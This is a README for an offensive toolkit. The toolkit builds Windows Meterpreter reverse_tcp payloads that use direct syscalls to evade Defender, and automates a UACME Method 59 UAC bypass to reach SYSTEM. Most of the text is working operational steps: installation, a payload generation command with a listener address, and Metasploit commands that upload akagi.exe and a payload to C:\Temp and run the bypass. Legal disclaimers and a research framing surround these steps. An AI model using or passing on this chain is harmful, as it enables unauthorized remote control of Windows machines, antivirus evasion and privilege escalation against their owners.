# Acheron Payload Research Toolkit

**Windows x64 payload generator with Acheron direct syscalls for security research + UAC bypass analysis via Akagi (UACME) Method 59**

A research-oriented toolkit for generating staged Meterpreter payloads using **Acheron direct syscalls** to study Windows Defender evasion techniques, with **UAC bypass analysis (Method 59 - Debug Object / PPID Spoofing)** via Akagi (UACME).

> **⚠️ Legal Disclaimer**: This toolkit is for **authorized security testing and research only**. Unauthorized access to computer systems is illegal. Use only on systems you own or have explicit written permission to test.

## Overview

Acheron Payload Toolkit is designed for security researchers to:
- Study direct syscall evasion techniques (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`)
- Analyze UAC bypass mechanisms (Method 59 - Debug Object / PPID Spoofing via AppInfo RPC)
- Test detection capabilities against staged Meterpreter payloads
- Research Windows internals and privilege escalation paths

## Architecture

```
┌─────────────────────┐     ┌──────────────────────┐     ┌─────────────────┐
│   Researcher (Kali) │────▶│   Test Target        │◀───│   Meterpreter   │
│                     │     │   (Windows)          │     │   Sessions      │
│  • acherongen.sh    │     │  • C:\Temp\          │     │                 │
│  • listener_gen.sh  │     │    akagi.exe         │     │  • Session 1    │
│  • akagi.exe (UACME)│     │    payload.exe       │     │  • SYSTEM (2)   │
│  • Metasploit module│     │                      │     │                 │
└─────────────────────┘     └──────────────────────┘     └─────────────────┘
```

## Features

| Component | Description |
|-----------|-------------|
| **Direct Syscalls** | Acheron library for `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` |
| **Staged Payload** | `windows/x64/meterpreter/reverse_tcp` (~511 bytes shellcode) |
| **Acheron EXE** | PE32+ x64, ~1.8 MB, direct syscalls for evasion research |
| **UAC Bypass Analysis** | Akagi (UACME) Method 59 - Debug Object / PPID Spoofing via AppInfo RPC |
| **Automation** | Single Metasploit module executes complete analysis chain |
| **TUI Interface** | Interactive menu for payload generation and listener management |
| **Meterpreter Upload** | Reliable file transfer via meterpreter `upload` command |
| **Cross-compiled** | Built on Linux (Kali) for Windows x64 |

## Installation

### Prerequisites (Kali Linux)
```bash
sudo apt update && sudo apt install -y golang-go metasploit-framework mingw-w64 shellcheck
```

### Install Toolkit
```bash
git clone https://github.com/hgguy/acheron-toolkit.git
cd acheron-toolkit
chmod +x installer.sh
./installer.sh
```

Installs to:
- `~/.local/share/acheron-toolkit/` - Toolkit files
- `~/.local/bin/acheron` - Global command
- `/usr/share/metasploit-framework/modules/post/windows/escalate/bypassuac_method59.rb` - Metasploit module (requires sudo)

### Akagi Binary (Required for UAC Bypass Analysis)
Place `akagi.exe` (UACME compiled binary) at `$HOME/.local/share/acheron-toolkit/bin/akagi.exe` or set custom path via `AKAGI_PATH` option.

**Compile Akagi on Windows (Visual Studio):**
```cmd
# From UACME repo: https://github.com/hfiref0x/UACME
# Open Source/Akagi/uacme.vcxproj in Visual Studio
# Build Release x64 → akagi64.exe → rename to akagi.exe
# Copy to Kali: ~/.local/share/acheron-toolkit/bin/akagi.exe
```

### Verify Installation
```bash
acheron
# or
acherongen.sh --help
```

## Usage

### 1. Generate Payload
```bash
# Interactive TUI
acheron
# Select 1 → LHOST → LPORT → Template (1=None)

# Direct command
acherongen.sh 192.168.1.100 4444 none
# Output: acheron_192.168.1.100_4444.exe (1.8 MB, PE32+ x64)
```

### 2. Start Listener (with UAC bypass auto-setup)
```bash
acheron
# Select 2 → LHOST → LPORT → y (launch msfconsole)
```
Generates `/tmp/acheron_listener_<PORT>.rc` with:
- `ExitOnSession false` (persistent listener)
- `InitialAutoRunScript` for UAC bypass alias

### 3. Execute UAC Bypass Analysis (when session received)
```bash
# In msfconsole after session received:
use post/windows/escalate/bypassuac_method59
set SESSION <session_id>
set LHOST <your_kali_ip>
set LPORT <your_port>
set AKAGI_PATH /home/user/.local/share/acheron-toolkit/bin/akagi.exe
run
```

**Automated analysis chain:**
1. Finds existing Acheron payload
2. Renames with random name
3. Uploads `akagi.exe` + payload to `C:\Temp`
4. Executes `akagi.exe 59 C:\Temp\payload.exe` (Method 59)
5. Opens SYSTEM session for analysis

### 4. Check Dependencies
```bash
acheron
# Select 3
```

## File Structure

```
acheron-toolkit/
├── toolkit.sh              # Main TUI
├── acherongen.sh           # Payload generator
├── listener_gen.sh         # Listener .rc generator
├── bypassuac_method59.rb   # Metasploit post-exploitation module
├── installer.sh            # Installs to ~/.local/share/acheron-toolkit + ~/.local/bin/acheron
├── templates/              # Optional file templates (PDF, DOCX, JPG)
├── .github/workflows/ci.yml  # CI: shellcheck, bash -n, static analysis
├── README.md
├── LICENSE
└── .gitignore
```

## UAC Bypass Details (Method 59)

**Technique**: Debug Object / PPID Spoofing via AppInfo RPC (James Forshaw / UACME)

1. Launches `winver.exe` under debug via AppInfo RPC to steal Debug Object
2. Launches `ComputerDefaults.exe` elevated under debug via AppInfo RPC
3. Attaches as debugger, captures elevated process handle on first DLL load
4. Duplicates handle with `PROCESS_ALL_ACCESS`
5. Uses `CreateProcessFromParent` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to spoof PPID
6. Executes payload as child of elevated process → runs as SYSTEM

**Requirements on target:**
- Windows 7/8/10/11 (x64)
- `C:\Temp` writable (default)
- `akagi.exe` + payload in same directory

**Note**: Method 59 effectiveness varies by Windows version and patch level. Tested on specific builds only.

## Building from Source

### Compile Akagi (Windows → Windows x64)
```cmd
# From UACME repo: https://github.com/hfiref0x/UACME
# Open Source/Akagi/uacme.vcxproj in Visual Studio 2019+
# Configuration: Release x64
# Runtime Library: Multi-threaded (/MT)
# Additional Dependencies: ntdll.lib rpcrt4.lib advapi32.lib shlwapi.lib
# Build → akagi64.exe → rename to akagi.exe
```

### Cross-compile Payload (Linux → Windows x64)
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o payload.exe main.go
```

## CI Pipeline

`.github/workflows/ci.yml`:
- ShellCheck linting for all shell scripts
- Bash syntax validation (`bash -n`)
- Static analysis of payload patterns (no execution)

Trigger on push/PR.

## Payload Details

| Property | Value |
|----------|-------|
| **Payload Type** | `windows/x64/meterpreter/reverse_tcp` (staged) |
| **Shellcode Size** | ~511 bytes |
| **EXE Size** | ~1.8 MB |
| **Format** | PE32+ x64 |
| **Evasion Research** | Acheron direct syscalls |
| **Compiler Flags** | `-ldflags="-s -w"` (strip symbols) |

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Upload fails | Check `C:\Temp` writable, try `session.fs.dir.mkdir` |
| Module not found | `reload_all` in msfconsole |
| Akagi not found | Set `AKAGI_PATH` option or place at default location |
| Session dies | Check `ExitOnSession false` in listener |
| No SYSTEM session | Verify `akagi.exe` on target, check patch level, Method 59 may not work on all versions |

## Security Notes

- **Authorized testing only** - Use only on systems you own or have explicit permission to test
- **Staged payload** - Requires listener running BEFORE victim executes payload
- **UAC bypass** - Requires `akagi.exe` on target (`C:\Temp\akagi.exe`)
- **Listener persistence** - `ExitOnSession false` keeps handler alive
- **Method 59 limitations** - May not work on all Windows versions/patch levels

## License

MIT License - See LICENSE file

## Disclaimer

This tool is for **authorized security testing and research only**. Unauthorized access to computer systems is illegal. Use only on systems you own or have explicit written permission to test.

## References

- [UACME / Akagi](https://github.com/hfiref0x/UACME) - UAC bypass methods
- [Acheron](https://github.com/f1zm0/acheron) - Direct syscalls library
- [James Forshaw - UAC Bypass Research](https://tyranidslair.blogspot.com/)

---

*Acheron Payload Research Toolkit v1.0*